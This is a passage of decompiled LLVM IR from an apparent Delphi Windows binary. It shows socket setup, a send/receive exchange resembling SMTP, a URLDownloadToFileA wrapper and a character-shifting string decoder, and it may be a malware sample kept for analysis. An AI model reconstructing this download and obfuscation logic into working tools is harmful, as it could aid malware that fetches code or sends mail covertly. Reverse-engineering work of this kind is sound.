  %1 = inttoptr i32 %0 to i8*, !insn.addr !675
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !676
  %3 = call i32 @"@FillChar"(), !insn.addr !677
  %4 = icmp eq %hostent* %2, null, !insn.addr !678
  br i1 %4, label %dec_label_pc_40504f, label %dec_label_pc_40502d, !insn.addr !679

dec_label_pc_40502d:                              ; preds = %dec_label_pc_405004
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !676
  %6 = add i32 %5, 12, !insn.addr !680
  %7 = inttoptr i32 %6 to i32*, !insn.addr !680
  %8 = load i32, i32* %7, align 4, !insn.addr !680
  %9 = inttoptr i32 %8 to i32*, !insn.addr !681
  %10 = load i32, i32* %9, align 4, !insn.addr !681
  %11 = inttoptr i32 %10 to i8*, !insn.addr !682
  %12 = load i8, i8* %11, align 1, !insn.addr !682
  %13 = sext i8 %12 to i32, !insn.addr !683
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !684
  br label %dec_label_pc_40504f, !insn.addr !684

dec_label_pc_40504f:                              ; preds = %dec_label_pc_40502d, %dec_label_pc_405004
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !685
}

define i32 @function_405060() local_unnamed_addr {
dec_label_pc_405060:
  %esp.0.reg2mem = alloca i32, !insn.addr !686
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !687
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !688
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !688
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !688
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !689
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !690
  %5 = trunc i32 %4 to i16, !insn.addr !690
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !691
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !692
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !692
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !693
  %9 = icmp eq i32 %8, -1, !insn.addr !694
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !695
  br i1 %9, label %dec_label_pc_4050ee, label %dec_label_pc_4050af, !insn.addr !695

dec_label_pc_4050af:                              ; preds = %dec_label_pc_405060
  %10 = call i32 @function_405004(), !insn.addr !696
  %11 = trunc i32 %10 to i16, !insn.addr !697
  %12 = call i16 @htons(i16 %11), !insn.addr !697
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !698
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !698
  %14 = sext i16 %12 to i32, !insn.addr !699
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !699
  %16 = icmp eq i32 %15, 0, !insn.addr !700
  %17 = icmp eq i1 %16, false, !insn.addr !701
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !701
  br i1 %17, label %dec_label_pc_4050ee, label %dec_label_pc_4050e6, !insn.addr !701

dec_label_pc_4050e6:                              ; preds = %dec_label_pc_4050af
  %18 = inttoptr i32 %0 to i32*, !insn.addr !702
  store i32 %8, i32* %18, align 4, !insn.addr !702
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !703
  br label %dec_label_pc_4050ee, !insn.addr !703

dec_label_pc_4050ee:                              ; preds = %dec_label_pc_4050e6, %dec_label_pc_4050af, %dec_label_pc_405060
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !704
  %20 = load i32, i32* %19, align 4, !insn.addr !704
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !705
  %21 = add i32 %esp.0.reload, 8, !insn.addr !706
  %22 = inttoptr i32 %21 to i32*, !insn.addr !706
  store i32 4215051, i32* %22, align 4, !insn.addr !706
  %23 = call i32 @"@LStrClr"(), !insn.addr !707
  ret i32 %23, !insn.addr !708
}

define i32 @function_405104() local_unnamed_addr {
dec_label_pc_405104:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !709
  ret i32 %0, !insn.addr !709
}

define i32 @function_405109() local_unnamed_addr {
dec_label_pc_405109:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !710
}

define i32 @function_40510b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40510b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !711
}

define i32 @function_405114() local_unnamed_addr {
dec_label_pc_405114:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !712
  %2 = call i32 @WSACleanup(), !insn.addr !713
  ret i32 %2, !insn.addr !714
}

define i32 @function_405120() local_unnamed_addr {
dec_label_pc_405120:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !715
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !716
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !716
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !716
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !717
  %4 = call i32 @function_4036c8(), !insn.addr !718
  %5 = call i32 @StrCopy(), !insn.addr !719
  %6 = call i32 @function_406f7c(i32 4), !insn.addr !720
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !721
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !722
  %9 = call i32 @"@LStrClr"(), !insn.addr !723
  ret i32 %9, !insn.addr !724
}

define i32 @function_405191() local_unnamed_addr {
dec_label_pc_405191:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !725
  ret i32 %0, !insn.addr !725
}

define i32 @function_405196() local_unnamed_addr {
dec_label_pc_405196:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !726
}

define i32 @function_405198(i32 %arg1) local_unnamed_addr {
dec_label_pc_405198:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !727
}

define i32 @function_4051a0() local_unnamed_addr {
dec_label_pc_4051a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !728
  %2 = call i32 @StrPas(), !insn.addr !729
  ret i32 %2, !insn.addr !730
}

define i32 @function_4051cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4051cc:
  %esp.1.reg2mem = alloca i32, !insn.addr !731
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !731
  %esp.0.reg2mem = alloca i32, !insn.addr !731
  %ecx.0.reg2mem = alloca i32, !insn.addr !731
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !732
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !733
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !733
  br label %dec_label_pc_4051d5, !insn.addr !733

dec_label_pc_4051d5:                              ; preds = %dec_label_pc_4051d5, %dec_label_pc_4051cc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !734
  %2 = inttoptr i32 %1 to i32*, !insn.addr !734
  store i32 0, i32* %2, align 4, !insn.addr !734
  %3 = add i32 %esp.0.reload, -8, !insn.addr !735
  %4 = inttoptr i32 %3 to i32*, !insn.addr !735
  store i32 0, i32* %4, align 4, !insn.addr !735
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !736
  %6 = icmp eq i32 %5, 0, !insn.addr !736
  %7 = icmp eq i1 %6, false, !insn.addr !737
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !737
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !737
  br i1 %7, label %dec_label_pc_4051d5, label %dec_label_pc_4051dc, !insn.addr !737

dec_label_pc_4051dc:                              ; preds = %dec_label_pc_4051d5
  %8 = add i32 %esp.0.reload, -12, !insn.addr !738
  %9 = inttoptr i32 %8 to i32*, !insn.addr !738
  store i32 0, i32* %9, align 4, !insn.addr !738
  %10 = call i32 @function_4036b8(), !insn.addr !739
  %11 = call i32 @function_4036b8(), !insn.addr !740
  %12 = call i32 @function_4036b8(), !insn.addr !741
  %13 = call i32 @function_4036b8(), !insn.addr !742
  %14 = call i32 @function_4036b8(), !insn.addr !743
  %15 = call i32 @function_4036b8(), !insn.addr !744
  %16 = call i32 @function_4036b8(), !insn.addr !745
  %17 = add i32 %esp.0.reload, -20, !insn.addr !746
  %18 = inttoptr i32 %17 to i32*, !insn.addr !746
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !746
  store i32 %19, i32* %18, align 4, !insn.addr !746
  %20 = add i32 %esp.0.reload, -24, !insn.addr !747
  %21 = inttoptr i32 %20 to i32*, !insn.addr !747
  store i32 4215873, i32* %21, align 4, !insn.addr !747
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !748
  %23 = add i32 %esp.0.reload, -28, !insn.addr !748
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !748
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !749
  %25 = call i32 @function_405060(), !insn.addr !750
  %26 = icmp eq i32 %25, 0, !insn.addr !751
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !752
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !752
  br i1 %26, label %dec_label_pc_40540c, label %dec_label_pc_40524a, !insn.addr !752

dec_label_pc_40524a:                              ; preds = %dec_label_pc_4051dc
  %27 = add i32 %esp.0.reload, -32, !insn.addr !753
  %28 = inttoptr i32 %27 to i32*, !insn.addr !753
  store i32 ptrtoint ([6 x i8]* @global_var_40545c to i32), i32* %28, align 4, !insn.addr !753
  %29 = add i32 %esp.0.reload, -36, !insn.addr !754
  %30 = inttoptr i32 %29 to i32*, !insn.addr !754
  %31 = add i32 %esp.0.reload, -40, !insn.addr !755
  %32 = inttoptr i32 %31 to i32*, !insn.addr !755
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %32, align 4, !insn.addr !755
  %33 = call i32 @"@LStrCatN"(), !insn.addr !756
  %34 = call i32 @function_405120(), !insn.addr !757
  %35 = call i32 @function_4051a0(), !insn.addr !758
  %36 = call i32 @function_405120(), !insn.addr !759
  %37 = call i32 @function_4051a0(), !insn.addr !760
  %38 = call i32 @"@LStrCat"(), !insn.addr !761
  %39 = call i32 @function_405120(), !insn.addr !762
  %40 = call i32 @function_4051a0(), !insn.addr !763
  %41 = call i32 @"@LStrCat"(), !insn.addr !764
  %42 = call i32 @function_405120(), !insn.addr !765
  %43 = call i32 @function_4051a0(), !insn.addr !766
  %44 = add i32 %esp.0.reload, -44, !insn.addr !767
  %45 = inttoptr i32 %44 to i32*, !insn.addr !767
  store i32 ptrtoint ([13 x i8]* @global_var_405490 to i32), i32* %45, align 4, !insn.addr !767
  %46 = add i32 %esp.0.reload, -48, !insn.addr !768
  %47 = inttoptr i32 %46 to i32*, !insn.addr !768
  store i32 %arg1, i32* %47, align 4, !insn.addr !768
  %48 = add i32 %esp.0.reload, -52, !insn.addr !769
  %49 = inttoptr i32 %48 to i32*, !insn.addr !769
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %49, align 4, !insn.addr !769
  %50 = add i32 %esp.0.reload, -56, !insn.addr !770
  %51 = inttoptr i32 %50 to i32*, !insn.addr !770
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %51, align 4, !insn.addr !770
  %52 = call i32 @"@LStrCatN"(), !insn.addr !771
  %53 = call i32 @function_405120(), !insn.addr !772
  %54 = call i32 @function_4051a0(), !insn.addr !773
  %55 = add i32 %esp.0.reload, -60, !insn.addr !774
  %56 = inttoptr i32 %55 to i32*, !insn.addr !774
  store i32 ptrtoint ([11 x i8]* @global_var_4054b4 to i32), i32* %56, align 4, !insn.addr !774
  %57 = add i32 %esp.0.reload, -64, !insn.addr !775
  %58 = inttoptr i32 %57 to i32*, !insn.addr !775
  store i32 %arg2, i32* %58, align 4, !insn.addr !775
  %59 = add i32 %esp.0.reload, -68, !insn.addr !776
  %60 = inttoptr i32 %59 to i32*, !insn.addr !776
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %60, align 4, !insn.addr !776
  %61 = add i32 %esp.0.reload, -72, !insn.addr !777
  %62 = inttoptr i32 %61 to i32*, !insn.addr !777
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %62, align 4, !insn.addr !777
  %63 = call i32 @"@LStrCatN"(), !insn.addr !778
  %64 = call i32 @function_405120(), !insn.addr !779
  %65 = call i32 @function_4051a0(), !insn.addr !780
  %66 = call i32 @function_405120(), !insn.addr !781
  %67 = call i32 @function_4051a0(), !insn.addr !782
  %68 = add i32 %esp.0.reload, -76, !insn.addr !783
  %69 = inttoptr i32 %68 to i32*, !insn.addr !783
  store i32 ptrtoint ([8 x i8]* @global_var_4054d8 to i32), i32* %69, align 4, !insn.addr !783
  %70 = add i32 %esp.0.reload, -80, !insn.addr !784
  %71 = inttoptr i32 %70 to i32*, !insn.addr !784
  store i32 %arg1, i32* %71, align 4, !insn.addr !784
  %72 = add i32 %esp.0.reload, -84, !insn.addr !785
  %73 = inttoptr i32 %72 to i32*, !insn.addr !785
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %73, align 4, !insn.addr !785
  %74 = add i32 %esp.0.reload, -88, !insn.addr !786
  %75 = inttoptr i32 %74 to i32*, !insn.addr !786
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %75, align 4, !insn.addr !786
  %76 = add i32 %esp.0.reload, -92, !insn.addr !787
  %77 = inttoptr i32 %76 to i32*, !insn.addr !787
  store i32 ptrtoint ([6 x i8]* @global_var_4054e8 to i32), i32* %77, align 4, !insn.addr !787
  %78 = add i32 %esp.0.reload, -96, !insn.addr !788
  %79 = inttoptr i32 %78 to i32*, !insn.addr !788
  store i32 %arg2, i32* %79, align 4, !insn.addr !788
  %80 = add i32 %esp.0.reload, -100, !insn.addr !789
  %81 = inttoptr i32 %80 to i32*, !insn.addr !789
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %81, align 4, !insn.addr !789
  %82 = add i32 %esp.0.reload, -104, !insn.addr !790
  %83 = inttoptr i32 %82 to i32*, !insn.addr !790
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %83, align 4, !insn.addr !790
  %84 = add i32 %esp.0.reload, -108, !insn.addr !791
  %85 = inttoptr i32 %84 to i32*, !insn.addr !791
  store i32 ptrtoint ([10 x i8]* @global_var_4054f8 to i32), i32* %85, align 4, !insn.addr !791
  %86 = add i32 %esp.0.reload, -112, !insn.addr !792
  %87 = inttoptr i32 %86 to i32*, !insn.addr !792
  store i32 %arg3, i32* %87, align 4, !insn.addr !792
  %88 = add i32 %esp.0.reload, -116, !insn.addr !793
  %89 = inttoptr i32 %88 to i32*, !insn.addr !793
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %89, align 4, !insn.addr !793
  %90 = add i32 %esp.0.reload, -120, !insn.addr !794
  %91 = inttoptr i32 %90 to i32*, !insn.addr !794
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %91, align 4, !insn.addr !794
  %92 = add i32 %esp.0.reload, -124, !insn.addr !795
  %93 = inttoptr i32 %92 to i32*, !insn.addr !795
  store i32 %arg4, i32* %93, align 4, !insn.addr !795
  %94 = add i32 %esp.0.reload, -128, !insn.addr !796
  %95 = inttoptr i32 %94 to i32*, !insn.addr !796
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %95, align 4, !insn.addr !796
  %96 = add i32 %esp.0.reload, -132, !insn.addr !797
  %97 = inttoptr i32 %96 to i32*, !insn.addr !797
  store i32 ptrtoint (i32* @global_var_40550c to i32), i32* %97, align 4, !insn.addr !797
  %98 = add i32 %esp.0.reload, -136, !insn.addr !798
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %99, align 4, !insn.addr !798
  %100 = call i32 @"@LStrCatN"(), !insn.addr !799
  %101 = call i32 @function_405120(), !insn.addr !800
  %102 = call i32 @function_4051a0(), !insn.addr !801
  %103 = call i32 @function_405120(), !insn.addr !802
  %104 = call i32 @function_4051a0(), !insn.addr !803
  %105 = call i32 @function_405114(), !insn.addr !804
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !805
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !805
  br label %dec_label_pc_40540c, !insn.addr !805

dec_label_pc_40540c:                              ; preds = %dec_label_pc_40524a, %dec_label_pc_4051dc
  %106 = add i32 %esp.0.reload, -16, !insn.addr !806
  %107 = inttoptr i32 %106 to i32*, !insn.addr !806
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !807
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !808
  %109 = add i32 %esp.1.reload, 8, !insn.addr !809
  %110 = inttoptr i32 %109 to i32*, !insn.addr !809
  store i32 4215880, i32* %110, align 4, !insn.addr !809
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !810
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !811
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !812
  ret i32 %113, !insn.addr !813
}

define i32 @function_405441() local_unnamed_addr {
dec_label_pc_405441:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !814
  ret i32 %0, !insn.addr !814
}

define i32 @function_405446() local_unnamed_addr {
dec_label_pc_405446:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !815
}

define i32 @function_405448(i32 %arg1) local_unnamed_addr {
dec_label_pc_405448:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !816
}

define i32 @function_405513() local_unnamed_addr {
dec_label_pc_405513:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !817
  %4 = inttoptr i32 %0 to i32*, !insn.addr !817
  store i32 %3, i32* %4, align 4, !insn.addr !817
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !818
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !818
  %9 = add i8 %6, %8, !insn.addr !818
  %10 = inttoptr i32 %7 to i8*, !insn.addr !818
  store i8 %9, i8* %10, align 1, !insn.addr !818
  %11 = add i32 %2, 85, !insn.addr !819
  %12 = inttoptr i32 %11 to i8*, !insn.addr !819
  %13 = load i8, i8* %12, align 1, !insn.addr !819
  %14 = trunc i32 %1 to i8, !insn.addr !819
  %15 = add i8 %13, %14, !insn.addr !819
  store i8 %15, i8* %12, align 1, !insn.addr !819
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !820
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !820
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !820
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !821
  %18 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !822
  %19 = add i32 %18, 1, !insn.addr !822
  %20 = icmp eq i32 %19, 0, !insn.addr !822
  store i32 %19, i32* @global_var_4096a4, align 4, !insn.addr !822
  %21 = icmp eq i1 %20, false, !insn.addr !823
  br i1 %21, label %dec_label_pc_40554d, label %dec_label_pc_405539, !insn.addr !823

dec_label_pc_405539:                              ; preds = %dec_label_pc_405513
  %22 = call i32 @"@LStrClr"(), !insn.addr !824
  %23 = call i32 @"@LStrClr"(), !insn.addr !825
  br label %dec_label_pc_40554d, !insn.addr !825

dec_label_pc_40554d:                              ; preds = %dec_label_pc_405539, %dec_label_pc_405513
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !826
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !827
  ret i32 0, !insn.addr !828
}

define i32 @function_40555b() local_unnamed_addr {
dec_label_pc_40555b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !829
  ret i32 %0, !insn.addr !829
}

define i32 @function_405560() local_unnamed_addr {
dec_label_pc_405560:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !830
}

define i32 @function_405562(i32 %arg1) local_unnamed_addr {
dec_label_pc_405562:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !831
}

define i32 @function_405564() local_unnamed_addr {
dec_label_pc_405564:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !832
  %2 = add i32 %1, -1, !insn.addr !832
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !832
  ret i32 %0, !insn.addr !833
}

define i32 @function_40556c() local_unnamed_addr {
dec_label_pc_40556c:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !834
  ret i32 %0, !insn.addr !834
}

define i32 @function_405574() local_unnamed_addr {
dec_label_pc_405574:
  %esi.0.reg2mem = alloca i32, !insn.addr !835
  %ebx.0.reg2mem = alloca i32, !insn.addr !835
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !836
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !837
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !837
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !837
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !838
  %4 = call i32 @function_4034c8(), !insn.addr !839
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !840
  %6 = call i32 @function_4034c8(), !insn.addr !841
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !842
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !842
  br i1 %7, label %dec_label_pc_4055ea, label %dec_label_pc_4055ba, !insn.addr !842

dec_label_pc_4055ba:                              ; preds = %dec_label_pc_405574, %dec_label_pc_4055e6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !843
  %10 = inttoptr i32 %9 to i8*, !insn.addr !843
  %11 = load i8, i8* %10, align 1, !insn.addr !843
  %12 = icmp eq i8 %11, 61, !insn.addr !843
  %13 = icmp eq i1 %12, false, !insn.addr !844
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_4055d2, label %dec_label_pc_4055c4, !insn.addr !844

dec_label_pc_4055c4:                              ; preds = %dec_label_pc_4055ba
  %15 = add i32 %14, %8, !insn.addr !845
  %16 = inttoptr i32 %15 to i8*, !insn.addr !845
  store i8 46, i8* %16, align 1, !insn.addr !845
  br label %dec_label_pc_4055e6, !insn.addr !846

dec_label_pc_4055d2:                              ; preds = %dec_label_pc_4055ba
  %17 = load i8, i8* %10, align 1, !insn.addr !847
  %18 = add i8 %17, -1, !insn.addr !848
  %19 = add i32 %14, %8, !insn.addr !849
  %20 = inttoptr i32 %19 to i8*, !insn.addr !849
  store i8 %18, i8* %20, align 1, !insn.addr !849
  br label %dec_label_pc_4055e6, !insn.addr !849

dec_label_pc_4055e6:                              ; preds = %dec_label_pc_4055d2, %dec_label_pc_4055c4
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !850
  %22 = add i32 %esi.0.reload, -1, !insn.addr !851
  %23 = icmp eq i32 %22, 0, !insn.addr !851
  %24 = icmp eq i1 %23, false, !insn.addr !852
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !852
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !852
  br i1 %24, label %dec_label_pc_4055ba, label %dec_label_pc_4055ea, !insn.addr !852

dec_label_pc_4055ea:                              ; preds = %dec_label_pc_4055e6, %dec_label_pc_405574
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !853
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !854
  %26 = call i32 @"@LStrClr"(), !insn.addr !855
  ret i32 %26, !insn.addr !856
}

define i32 @function_405600() local_unnamed_addr {
dec_label_pc_405600:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !857
  ret i32 %0, !insn.addr !857
}

define i32 @function_405605() local_unnamed_addr {
dec_label_pc_405605:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !858
}

define i32 @function_405607(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405607:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !859
}

define i32 @function_405610() local_unnamed_addr {
dec_label_pc_405610:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !860
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !861
  %4 = call i32 @"@LStrFromString"(), !insn.addr !862
  ret i32 %4, !insn.addr !863
}

define i32 @function_405648() local_unnamed_addr {
dec_label_pc_405648:
  %ecx.0.reg2mem = alloca i32, !insn.addr !864
  %esp.0.reg2mem = alloca i32, !insn.addr !864
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !864
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !865
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !865
  br label %dec_label_pc_405650, !insn.addr !865

dec_label_pc_405650:                              ; preds = %dec_label_pc_405650, %dec_label_pc_405648
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !866
  %2 = inttoptr i32 %1 to i32*, !insn.addr !866
  store i32 0, i32* %2, align 4, !insn.addr !866
  %3 = add i32 %esp.0.reload, -8, !insn.addr !867
  %4 = inttoptr i32 %3 to i32*, !insn.addr !867
  store i32 0, i32* %4, align 4, !insn.addr !867
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !868
  %6 = icmp eq i32 %5, 0, !insn.addr !868
  %7 = icmp eq i1 %6, false, !insn.addr !869
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !869
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !869
  br i1 %7, label %dec_label_pc_405650, label %dec_label_pc_405657, !insn.addr !869

dec_label_pc_405657:                              ; preds = %dec_label_pc_405650
  %8 = add i32 %esp.0.reload, -12, !insn.addr !870
  %9 = inttoptr i32 %8 to i32*, !insn.addr !870
  store i32 0, i32* %9, align 4, !insn.addr !870
  %10 = add i32 %esp.0.reload, -16, !insn.addr !871
  %11 = inttoptr i32 %10 to i32*, !insn.addr !871
  %12 = add i32 %esp.0.reload, -20, !insn.addr !872
  %13 = inttoptr i32 %12 to i32*, !insn.addr !872
  store i32 %0, i32* %13, align 4, !insn.addr !872
  %14 = add i32 %esp.0.reload, -24, !insn.addr !873
  %15 = inttoptr i32 %14 to i32*, !insn.addr !873
  store i32 4216719, i32* %15, align 4, !insn.addr !873
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !874
  %17 = add i32 %esp.0.reload, -28, !insn.addr !874
  %18 = inttoptr i32 %17 to i32*, !insn.addr !874
  store i32 %16, i32* %18, align 4, !insn.addr !874
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !875
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !876
  %20 = call i32 @function_405574(), !insn.addr !877
  %21 = call i32 @function_4036c8(), !insn.addr !878
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !879
  %23 = add i32 %esp.0.reload, -32, !insn.addr !880
  %24 = inttoptr i32 %23 to i32*, !insn.addr !880
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !880
  store i32 %25, i32* %24, align 4, !insn.addr !880
  %26 = call i32 @"@LStrCopy"(), !insn.addr !881
  %27 = call i32 @"@LStrDelete"(), !insn.addr !882
  %28 = add i32 %esp.0.reload, -36, !insn.addr !883
  %29 = inttoptr i32 %28 to i32*, !insn.addr !883
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !883
  store i32 %30, i32* %29, align 4, !insn.addr !883
  %31 = call i32 @function_4034c8(), !insn.addr !884
  %32 = call i32 @"@LStrCopy"(), !insn.addr !885
  %33 = add i32 %esp.0.reload, -40, !insn.addr !886
  %34 = inttoptr i32 %33 to i32*, !insn.addr !886
